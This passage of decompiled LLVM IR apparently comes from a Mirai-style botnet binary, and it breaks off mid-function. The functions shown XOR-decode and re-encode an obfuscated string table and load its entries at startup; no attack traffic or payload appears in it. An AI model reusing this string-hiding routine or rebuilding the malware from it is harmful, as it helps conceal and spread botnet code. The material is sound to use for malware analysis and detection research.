  uselistorder i32 ()* @rand_next, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 2, 1, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 6, 5, 4, 3, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_243f0.149, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_243ec.147, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_21908.135, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_243d0.55, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_243d0.55 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fc18, { 1, 0 }
  uselistorder label %dec_label_pc_fc10, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fc04, { 1, 0 }
  uselistorder label %dec_label_pc_ef54.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef54.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef54.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9f4, { 1, 0 }
  uselistorder label %dec_label_pc_f954, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f91c, { 1, 0 }
  uselistorder label %dec_label_pc_f908, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f8f8, { 1, 0 }
  uselistorder label %dec_label_pc_f7e8, { 1, 0 }
  uselistorder label %dec_label_pc_f768, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f734, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f6e4, { 1, 0 }
  uselistorder label %dec_label_pc_f628, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f610, { 1, 0 }
  uselistorder label %dec_label_pc_f4dc, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f4c4, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f3f0, { 1, 0 }
  uselistorder label %dec_label_pc_f37c, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f348, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f328, { 1, 0 }
  uselistorder label %dec_label_pc_f314, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f2d0, { 1, 0 }
  uselistorder label %dec_label_pc_f2d0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f264, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f24c, { 1, 0 }
  uselistorder label %dec_label_pc_f190, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f178, { 1, 0 }
  uselistorder label %dec_label_pc_f058, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f020, { 1, 0 }
  uselistorder label %dec_label_pc_efb8, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef6c, { 1, 0 }
  uselistorder label %dec_label_pc_ef5c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef5c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee5c, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed50.dec_label_pc_ed50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed2c.dec_label_pc_ed2c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed20, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ed08, { 1, 0 }
  uselistorder label %dec_label_pc_ece4, { 1, 0 }
  uselistorder label %dec_label_pc_eb98, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_eb84, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
  uselistorder label %dec_label_pc_ea0c, { 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 1, 0 }
  uselistorder label %dec_label_pc_e9f4, { 1, 0 }
  uselistorder label %dec_label_pc_e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_e9d4, { 1, 0 }
  uselistorder label %dec_label_pc_e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_e9ac, { 1, 0 }
  uselistorder label %dec_label_pc_e98c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e968, { 1, 0 }
  uselistorder label %dec_label_pc_e95c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e938, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e8c0, { 30, 6, 29, 2, 10, 3, 11, 4, 12, 5, 13, 0, 14, 15, 16, 17, 7, 8, 9, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 31 }
  uselistorder label %dec_label_pc_e6b0, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_243fc.211 to i32), i32* @r2, align 4
  %v3_fcc0 = mul i32 %arg1, 8
  %v2_fcc4 = add i32 %v3_fcc0, ptrtoint (i32* @global_var_243fc.211 to i32)
  store i32 %v2_fcc4, i32* @r3, align 4
  %v2_fcc8 = icmp eq i32* %arg2, null
  br i1 %v2_fcc8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_fcd04 = inttoptr i32 %v2_fcc4 to i32*
  %v4_fcd05 = load i32, i32* %v3_fcd04, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_fccc = add i32 %v3_fcc0, add (i32 ptrtoint (i32* @global_var_243fc.211 to i32), i32 4)
  %v3_fccc = inttoptr i32 %v2_fccc to i16*
  %v4_fccc = load i16, i16* %v3_fccc, align 4
  %v5_fccc = zext i16 %v4_fccc to i32
  store i32 %v5_fccc, i32* @r3, align 4
  %v3_fcd0 = inttoptr i32 %v2_fcc4 to i32*
  %v4_fcd0 = load i32, i32* %v3_fcd0, align 4
  store i32 %v5_fccc, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fcd06 = phi i32 [ %v4_fcd05, %.thread ], [ %v4_fcd0, %bb ]
  ret i32 %v4_fcd06

; uselistorder directives
  uselistorder i32 %v2_fcc4, { 1, 0, 2 }
  uselistorder i32 %v3_fcc0, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fce8 = mul i32 %arg1, 8
  %v2_fcec = add i32 %v3_fce8, ptrtoint (i32* @global_var_243fc.211 to i32)
  %v2_fcf0 = load i32, i32* @global_var_2174c.214, align 4
  store i32 %v2_fcf0, i32* @r1, align 4
  %v1_fcf4 = add i32 %v3_fce8, add (i32 ptrtoint (i32* @global_var_243fc.211 to i32), i32 4)
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i16*
  %v3_fcf4 = load i16, i16* %v2_fcf4, align 4
  %v3_fcf8 = udiv i32 %v2_fcf0, 256
  %v2_fcfc = icmp eq i16 %v3_fcf4, 0
  %v3_fd00 = udiv i32 %v2_fcf0, 65536
  store i32 %v3_fd00, i32* @r3, align 4
  %v3_fd04 = load i32, i32* @r4, align 4
  store i32 %v3_fd04, i32* %stack_var_-16, align 4
  %v1_fd08 = urem i32 %v3_fcf8, 256
  store i32 %v1_fd08, i32* %r6.global-to-local, align 4
  %v1_fd0c = urem i32 %v3_fd00, 256
  store i32 %v1_fd0c, i32* %r5.global-to-local, align 4
  %v3_fd10 = udiv i32 %v2_fcf0, 16777216
  store i32 %v3_fd10, i32* %r4.global-to-local, align 4
  %v1_fd14 = urem i32 %v2_fcf0, 256
  store i32 %v1_fd14, i32* %lr.global-to-local, align 4
  br i1 %v2_fcfc, label %dec_label_pc_fd70, label %dec_label_pc_fd1c

dec_label_pc_fd1c:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fd20 = inttoptr i32 %v2_fcec to i32*
  br label %dec_label_pc_fd20

dec_label_pc_fd20:                                ; preds = %dec_label_pc_fd20.dec_label_pc_fd20_crit_edge, %dec_label_pc_fd1c
  %v0_fd28 = phi i32 [ %v0_fd28.pre, %dec_label_pc_fd20.dec_label_pc_fd20_crit_edge ], [ %v1_fd14, %dec_label_pc_fd1c ]
  %v2_fd2c = phi i32 [ %v1_fd64, %dec_label_pc_fd20.dec_label_pc_fd20_crit_edge ], [ 0, %dec_label_pc_fd1c ]
  %v2_fd20 = load i32, i32* %v1_fd20, align 4
  %v2_fd24 = add i32 %v2_fd20, %v2_fd2c
  %v3_fd24 = inttoptr i32 %v2_fd24 to i8*
  %v4_fd24 = load i8, i8* %v3_fd24, align 1
  %v6_fd24 = zext i8 %v4_fd24 to i32
  %v2_fd28 = xor i32 %v6_fd24, %v0_fd28
  %v1_fd2c = trunc i32 %v2_fd28 to i8
  store i8 %v1_fd2c, i8* %v3_fd24, align 1
  %v2_fd30 = load i32, i32* %v1_fd20, align 4
  %v0_fd34 = load i32, i32* @ip, align 4
  %v2_fd34 = add i32 %v0_fd34, %v2_fd30
  %v3_fd34 = inttoptr i32 %v2_fd34 to i8*
  %v4_fd34 = load i8, i8* %v3_fd34, align 1
  %v6_fd34 = zext i8 %v4_fd34 to i32
  %v0_fd38 = load i32, i32* %r6.global-to-local, align 4
  %v2_fd38 = xor i32 %v0_fd38, %v6_fd34
  %v1_fd3c = trunc i32 %v2_fd38 to i8
  store i8 %v1_fd3c, i8* %v3_fd34, align 1
  %v2_fd40 = load i32, i32* %v1_fd20, align 4
  %v0_fd44 = load i32, i32* @ip, align 4
  %v2_fd44 = add i32 %v0_fd44, %v2_fd40
  %v3_fd44 = inttoptr i32 %v2_fd44 to i8*
  %v4_fd44 = load i8, i8* %v3_fd44, align 1
  %v6_fd44 = zext i8 %v4_fd44 to i32
  %v0_fd48 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd48 = xor i32 %v0_fd48, %v6_fd44
  %v1_fd4c = trunc i32 %v2_fd48 to i8
  store i8 %v1_fd4c, i8* %v3_fd44, align 1
  %v2_fd50 = load i32, i32* %v1_fd20, align 4
  store i32 %v2_fd50, i32* @r1, align 4
  %v0_fd54 = load i32, i32* @ip, align 4
  %v2_fd54 = add i32 %v0_fd54, %v2_fd50
  %v3_fd54 = inttoptr i32 %v2_fd54 to i8*
  %v4_fd54 = load i8, i8* %v3_fd54, align 1
  %v6_fd54 = zext i8 %v4_fd54 to i32
  %v0_fd58 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd58 = xor i32 %v0_fd58, %v6_fd54
  store i32 %v2_fd58, i32* @r3, align 4
  %v1_fd5c = trunc i32 %v2_fd58 to i8
  store i8 %v1_fd5c, i8* %v3_fd54, align 1
  %v3_fd60 = load i16, i16* %v2_fcf4, align 4
  %v4_fd60 = zext i16 %v3_fd60 to i32
  %v0_fd64 = load i32, i32* @ip, align 4
  %v1_fd64 = add i32 %v0_fd64, 1
  store i32 %v1_fd64, i32* @ip, align 4
  %v8_fd6c = icmp sgt i32 %v4_fd60, %v1_fd64
  br i1 %v8_fd6c, label %dec_label_pc_fd20.dec_label_pc_fd20_crit_edge, label %dec_label_pc_fd70.loopexit

dec_label_pc_fd20.dec_label_pc_fd20_crit_edge:    ; preds = %dec_label_pc_fd20
  %v0_fd28.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd20

dec_label_pc_fd70.loopexit:                       ; preds = %dec_label_pc_fd20
  %v2_fd70.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd70

dec_label_pc_fd70:                                ; preds = %dec_label_pc_fd70.loopexit, %entry
  %v2_fd70 = phi i32 [ %v2_fd70.pre, %dec_label_pc_fd70.loopexit ], [ %v3_fd04, %entry ]
  store i32 %v2_fd70, i32* @r4, align 4
  ret i32 %v2_fcec

; uselistorder directives
  uselistorder i32 %v1_fd64, { 1, 2, 0 }
  uselistorder i32 %v1_fd14, { 1, 0 }
  uselistorder i32 %v3_fd00, { 1, 0 }
  uselistorder i32 %v2_fcf0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_fce8, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd88 = mul i32 %arg1, 8
  %v2_fd8c = add i32 %v3_fd88, ptrtoint (i32* @global_var_243fc.211 to i32)
  %v2_fd90 = load i32, i32* @global_var_2174c.214, align 4
  %v1_fd94 = add i32 %v3_fd88, add (i32 ptrtoint (i32* @global_var_243fc.211 to i32), i32 4)
  %v2_fd94 = inttoptr i32 %v1_fd94 to i16*
  %v3_fd94 = load i16, i16* %v2_fd94, align 4
  %v3_fd98 = udiv i32 %v2_fd90, 256
  %v2_fd9c = icmp eq i16 %v3_fd94, 0
  %v3_fda0 = udiv i32 %v2_fd90, 65536
  %v3_fda4 = load i32, i32* @r4, align 4
  store i32 %v3_fda4, i32* %stack_var_-16, align 4
  %v1_fda8 = urem i32 %v3_fd98, 256
  store i32 %v1_fda8, i32* %r6.global-to-local, align 4
  %v1_fdac = urem i32 %v3_fda0, 256
  store i32 %v1_fdac, i32* %r5.global-to-local, align 4
  %v3_fdb0 = udiv i32 %v2_fd90, 16777216
  store i32 %v3_fdb0, i32* %r4.global-to-local, align 4
  %v1_fdb4 = urem i32 %v2_fd90, 256
  store i32 %v1_fdb4, i32* %lr.global-to-local, align 4
  br i1 %v2_fd9c, label %dec_label_pc_fe10, label %dec_label_pc_fdbc

dec_label_pc_fdbc:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fdc0 = inttoptr i32 %v2_fd8c to i32*
  br label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdc0.dec_label_pc_fdc0_crit_edge, %dec_label_pc_fdbc
  %v0_fdc8 = phi i32 [ %v0_fdc8.pre, %dec_label_pc_fdc0.dec_label_pc_fdc0_crit_edge ], [ %v1_fdb4, %dec_label_pc_fdbc ]
  %v2_fdcc = phi i32 [ %v1_fe04, %dec_label_pc_fdc0.dec_label_pc_fdc0_crit_edge ], [ 0, %dec_label_pc_fdbc ]
  %v2_fdc0 = load i32, i32* %v1_fdc0, align 4
  %v2_fdc4 = add i32 %v2_fdc0, %v2_fdcc
  %v3_fdc4 = inttoptr i32 %v2_fdc4 to i8*
  %v4_fdc4 = load i8, i8* %v3_fdc4, align 1
  %v6_fdc4 = zext i8 %v4_fdc4 to i32
  %v2_fdc8 = xor i32 %v6_fdc4, %v0_fdc8
  %v1_fdcc = trunc i32 %v2_fdc8 to i8
  store i8 %v1_fdcc, i8* %v3_fdc4, align 1
  %v2_fdd0 = load i32, i32* %v1_fdc0, align 4
  %v0_fdd4 = load i32, i32* @ip, align 4
  %v2_fdd4 = add i32 %v0_fdd4, %v2_fdd0
  %v3_fdd4 = inttoptr i32 %v2_fdd4 to i8*
  %v4_fdd4 = load i8, i8* %v3_fdd4, align 1
  %v6_fdd4 = zext i8 %v4_fdd4 to i32
  %v0_fdd8 = load i32, i32* %r6.global-to-local, align 4
  %v2_fdd8 = xor i32 %v0_fdd8, %v6_fdd4
  %v1_fddc = trunc i32 %v2_fdd8 to i8
  store i8 %v1_fddc, i8* %v3_fdd4, align 1
  %v2_fde0 = load i32, i32* %v1_fdc0, align 4
  %v0_fde4 = load i32, i32* @ip, align 4
  %v2_fde4 = add i32 %v0_fde4, %v2_fde0
  %v3_fde4 = inttoptr i32 %v2_fde4 to i8*
  %v4_fde4 = load i8, i8* %v3_fde4, align 1
  %v6_fde4 = zext i8 %v4_fde4 to i32
  %v0_fde8 = load i32, i32* %r5.global-to-local, align 4
  %v2_fde8 = xor i32 %v0_fde8, %v6_fde4
  %v1_fdec = trunc i32 %v2_fde8 to i8
  store i8 %v1_fdec, i8* %v3_fde4, align 1
  %v2_fdf0 = load i32, i32* %v1_fdc0, align 4
  %v0_fdf4 = load i32, i32* @ip, align 4
  %v2_fdf4 = add i32 %v0_fdf4, %v2_fdf0
  %v3_fdf4 = inttoptr i32 %v2_fdf4 to i8*
  %v4_fdf4 = load i8, i8* %v3_fdf4, align 1
  %v6_fdf4 = zext i8 %v4_fdf4 to i32
  %v0_fdf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_fdf8 = xor i32 %v0_fdf8, %v6_fdf4
  %v1_fdfc = trunc i32 %v2_fdf8 to i8
  store i8 %v1_fdfc, i8* %v3_fdf4, align 1
  %v3_fe00 = load i16, i16* %v2_fd94, align 4
  %v4_fe00 = zext i16 %v3_fe00 to i32
  %v0_fe04 = load i32, i32* @ip, align 4
  %v1_fe04 = add i32 %v0_fe04, 1
  store i32 %v1_fe04, i32* @ip, align 4
  %v8_fe0c = icmp sgt i32 %v4_fe00, %v1_fe04
  br i1 %v8_fe0c, label %dec_label_pc_fdc0.dec_label_pc_fdc0_crit_edge, label %dec_label_pc_fe10.loopexit

dec_label_pc_fdc0.dec_label_pc_fdc0_crit_edge:    ; preds = %dec_label_pc_fdc0
  %v0_fdc8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fdc0

dec_label_pc_fe10.loopexit:                       ; preds = %dec_label_pc_fdc0
  %v2_fe10.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fe10.loopexit, %entry
  %v2_fe10 = phi i32 [ %v2_fe10.pre, %dec_label_pc_fe10.loopexit ], [ %v3_fda4, %entry ]
  store i32 %v2_fe10, i32* @r4, align 4
  ret i32 %v2_fd8c

; uselistorder directives
  uselistorder i32 %v1_fe04, { 1, 2, 0 }
  uselistorder i32 %v1_fdb4, { 1, 0 }
  uselistorder i32 %v2_fd90, { 3, 0, 1, 2 }
  uselistorder i32 %v2_fd8c, { 1, 0 }
  uselistorder i32 %v3_fd88, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_fe20 = load i32, i32* @r4, align 4
  store i32 %v3_fe20, i32* %stack_var_-32, align 4
  %v6_fe20 = load i32, i32* @r5, align 4
  %v9_fe20 = load i32, i32* @r6, align 4
  %v12_fe20 = load i32, i32* @r7, align 4
  %v15_fe20 = load i32, i32* @r8, align 4
  %v18_fe20 = load i32, i32* @sb, align 4
  %v21_fe20 = load i32, i32* @sl, align 4
  %v1_fe28 = call i32 @malloc(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_243fc.211 to i32), i32* @r4, align 4
  store i32 %v1_fe28, i32* @r6, align 4
  %v4_fe40 = call i32 @util_memcpy(i32 %v1_fe28, i32 ptrtoint ([3 x i8]* @global_var_19080.219 to i32), i32 2)
  %v0_fe44 = load i32, i32* @r5, align 4
  %v0_fe48 = load i32, i32* @r6, align 4
  store i32 %v0_fe48, i32* @global_var_24404.220, align 4
  %v1_fe4c = trunc i32 %v0_fe44 to i16
  store i16 %v1_fe4c, i16* bitcast (i32* @global_var_24408.221 to i16*), align 4
  %v1_fe50 = call i32 @malloc(i32 %v0_fe44)
  %v0_fe54 = load i32, i32* @r5, align 4
  store i32 %v1_fe50, i32* @r6, align 4
  %v3_fe60 = call i32 @util_memcpy(i32 %v1_fe50, i32 ptrtoint (i32* @global_var_19084.223 to i32), i32 %v0_fe54)
  %v0_fe68 = load i32, i32* @r6, align 4
  store i32 %v0_fe68, i32* @global_var_2440c.224, align 4
  %v0_fe6c = load i32, i32* @r5, align 4
  %v1_fe6c = trunc i32 %v0_fe6c to i16
  store i16 %v1_fe6c, i16* bitcast (i32* @global_var_24410.225 to i16*), align 4
  %v1_fe70 = call i32 @malloc(i32 29)
  store i32 %v1_fe70, i32* @r5, align 4
  %v3_fe80 = call i32 @util_memcpy(i32 %v1_fe70, i32 ptrtoint (i32* @global_var_19168.227 to i32), i32 29)
  store i16 29, i16* bitcast (i32* @global_var_24418.228 to i16*), align 4
  %v0_fe90 = load i32, i32* @r5, align 4
  store i32 %v0_fe90, i32* @global_var_24414.229, align 4
  %v1_fe94 = call i32 @malloc(i32 7)
  store i32 %v1_fe94, i32* @r5, align 4
  store i32 7, i32* @r7, align 4
  %v4_fea8 = call i32 @util_memcpy(i32 %v1_fe94, i32 ptrtoint ([8 x i8]* @global_var_19088.231 to i32), i32 7)
  %v0_feb0 = load i32, i32* @r5, align 4
  store i32 %v0_feb0, i32* @global_var_24464.232, align 4
  %v0_feb4 = load i32, i32* @r7, align 4
  %v1_feb4 = trunc i32 %v0_feb4 to i16
  store i16 %v1_feb4, i16* bitcast (i32* @global_var_24468.233 to i16*), align 4
  %v1_feb8 = call i32 @malloc(i32 5)
  store i32 %v1_feb8, i32* @r5, align 4
  store i32 5, i32* @sb, align 4
  %v4_fecc = call i32 @util_memcpy(i32 %v1_feb8, i32 ptrtoint ([6 x i8]* @global_var_19090.235 to i32), i32 5)
  %v0_fed4 = load i32, i32* @r5, align 4
  store i32 %v0_fed4, i32* @global_var_2446c.236, align 4
  %v0_fed8 = load i32, i32* @sb, align 4
  %v1_fed8 = trunc i32 %v0_fed8 to i16
  store i16 %v1_fed8, i16* bitcast (i32* @global_var_24470.237 to i16*), align 4
  %v1_fedc = call i32 @malloc(i32 4)
  store i32 %v1_fedc, i32* @r5, align 4
  %v4_feec = call i32 @util_memcpy(i32 %v1_fedc, i32 ptrtoint ([5 x i8]* @global_var_19098.239 to i32), i32 4)
  store i16 4, i16* bitcast (i32* @global_var_24478.240 to i16*), align 4
  %v0_fefc = load i32, i32* @r5, align 4
  store i32 %v0_fefc, i32* @global_var_24474.241, align 4
  %v1_ff00 = call i32 @malloc(i32 6)
  store i32 %v1_ff00, i32* @r5, align 4
  store i32 6, i32* @sl, align 4
  %v4_ff14 = call i32 @util_memcpy(i32 %v1_ff00, i32 ptrtoint ([7 x i8]* @global_var_190a0.243 to i32), i32 6)
  %v0_ff1c = load i32, i32* @r5, align 4
  store i32 %v0_ff1c, i32* @global_var_2447c.244, align 4
  %v0_ff20 = load i32, i32* @sl, align 4
  %v1_ff20 = trunc i32 %v0_ff20 to i16
  store i16 %v1_ff20, i16* bitcast (i32* @global_var_24480.245 to i16*), align 4
  %v1_ff24 = call i32 @malloc(i32 14)
  store i32 %v1_ff24, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_ff38 = call i32 @util_memcpy(i32 %v1_ff24, i32 ptrtoint ([15 x i8]* @global_var_190a8.247 to i32), i32 14)
  %v0_ff40 = load i32, i32* @r5, align 4
  store i32 %v0_ff40, i32* @global_var_24484.248, align 4
  %v0_ff44 = load i32, i32* @r8, align 4
  %v1_ff44 = trunc i32 %v0_ff44 to i16
  store i16 %v1_ff44, i16* bitcast (i32* @global_var_24488.249 to i16*), align 4
  %v1_ff48 = call i32 @malloc(i32 8)
  store i32 8, i32* @r6, align 4
  store i32 %v1_ff48, i32* @r5, align 4
  %v4_ff5c = call i32 @util_memcpy(i32 %v1_ff48, i32 ptrtoint ([9 x i8]* @global_var_190b8.251 to i32), i32 8)
  %v0_ff60 = load i32, i32* @r7, align 4
  %v0_ff64 = load i32, i32* @r5, align 4
  store i32 %v0_ff64, i32* @global_var_244e4.252, align 4
  %v0_ff68 = load i32, i32* @r6, align 4
  %v1_ff68 = trunc i32 %v0_ff68 to i16
  store i16 %v1_ff68, i16* bitcast (i32* @global_var_244e8.253 to i16*), align 4
  %v1_ff6c = call i32 @malloc(i32 %v0_ff60)
  %v0_ff74 = load i32, i32* @r7, align 4
  store i32 %v1_ff6c, i32* @r5, align 4
  %v4_ff7c = call i32 @util_memcpy(i32 %v1_ff6c, i32 ptrtoint ([8 x i8]* @global_var_190c4.255 to i32), i32 %v0_ff74)
  %v0_ff84 = load i32, i32* @r5, align 4
  store i32 %v0_ff84, i32* @global_var_244ec.256, align 4
  %v0_ff88 = load i32, i32* @r7, align 4
  %v1_ff88 = trunc i32 %v0_ff88 to i16
  store i16 %v1_ff88, i16* bitcast (i32* @global_var_244f0.257 to i16*), align 4
  %v1_ff8c = call i32 @malloc(i32 16)
  store i32 %v1_ff8c, i32* @r5, align 4
  %v4_ff9c = call i32 @util_memcpy(i32 %v1_ff8c, i32 ptrtoint ([17 x i8]* @global_var_190cc.259 to i32), i32 16)
  %v0_ffa4 = load i32, i32* @r6, align 4
  store i16 16, i16* bitcast (i32* @global_var_24490.260 to i16*), align 4
  %v0_ffac = load i32, i32* @r5, align 4
  store i32 %v0_ffac, i32* @global_var_2448c.261, align 4
  %v1_ffb0 = call i32 @malloc(i32 %v0_ffa4)
  %v0_ffb8 = load i32, i32* @r6, align 4
  store i32 %v1_ffb0, i32* @r5, align 4
  %v4_ffc0 = call i32 @util_memcpy(i32 %v1_ffb0, i32 ptrtoint ([9 x i8]* @global_var_190e0.263 to i32), i32 %v0_ffb8)
  %v0_ffc8 = load i32, i32* @r5, align 4
  store i32 %v0_ffc8, i32* @global_var_24494.264, align 4
  %v0_ffcc = load i32, i32* @r6, align 4
  %v1_ffcc = trunc i32 %v0_ffcc to i16
  store i16 %v1_ffcc, i16* bitcast (i32* @global_var_24498.265 to i16*), align 4
  %v1_ffd0 = call i32 @malloc(i32 21)
  store i32 %v1_ffd0, i32* @r5, align 4
  %v3_ffe0 = call i32 @util_memcpy(i32 %v1_ffd0, i32 ptrtoint (i32* @global_var_19188.267 to i32), i32 21)
  store i16 21, i16* bitcast (i32* @global_var_244a0.268 to i16*), align 4
  %v0_fff0 = load i32, i32* @r5, align 4
  store i32 %v0_fff0, i32* @global_var_2449c.269, align 4
  %v1_fff4 = call i32 @malloc(i32 17)
  store i32 %v1_fff4, i32* @r5, align 4
  %v4_10004 = call i32 @util_memcpy(i32 %v1_fff4, i32 ptrtoint ([18 x i8]* @global_var_190ec.271 to i32), i32 17)
  store i16 17, i16* bitcast (i32* @global_var_244a8.272 to i16*), align 4
  %v0_10014 = load i32, i32* @r5, align 4
  store i32 %v0_10014, i32* @global_var_244a4.273, align 4
  %v1_10018 = call i32 @malloc(i32 12)
  store i32 %v1_10018, i32* @r5, align 4
  %v4_10028 = call i32 @util_memcpy(i32 %v1_10018, i32 ptrtoint ([13 x i8]* @global_var_19100.275 to i32), i32 12)
  %v0_10030 = load i32, i32* @r8, align 4
  store i16 12, i16* bitcast (i32* @global_var_244b0.276 to i16*), align 4
  %v0_10038 = load i32, i32* @r5, align 4
  store i32 %v0_10038, i32* @global_var_244ac.277, align 4
  %v1_1003c = call i32 @malloc(i32 %v0_10030)
  %v0_10044 = load i32, i32* @r8, align 4
  store i32 %v1_1003c, i32* @r5, align 4
  %v4_1004c = call i32 @util_memcpy(i32 %v1_1003c, i32 ptrtoint ([15 x i8]* @global_var_19110.279 to i32), i32 %v0_10044)
  %v0_10054 = load i32, i32* @r5, align 4
  store i32 %v0_10054, i32* @global_var_244b4.280, align 4
  %v0_10058 = load i32, i32* @r8, align 4
  %v1_10058 = trunc i32 %v0_10058 to i16
  store i16 %v1_10058, i16* bitcast (i32* @global_var_244b8.281 to i16*), align 4
  %v1_1005c = call i32 @malloc(i32 19)
  store i32 %v1_1005c, i32* @r5, align 4
  %v4_1006c = call i32 @util_memcpy(i32 %v1_1005c, i32 ptrtoint ([20 x i8]* @global_var_19120.283 to i32), i32 19)
  %v0_10074 = load i32, i32* @r6, align 4
  store i16 19, i16* bitcast (i32* @global_var_244c0.284 to i16*), align 4
  %v0_1007c = load i32, i32* @r5, align 4
  store i32 %v0_1007c, i32* @global_var_244bc.285, align 4
  %v1_10080 = call i32 @malloc(i32 %v0_10074)
  %v0_10088 = load i32, i32* @r6, align 4
  store i32 %v1_10080, i32* @r5, align 4
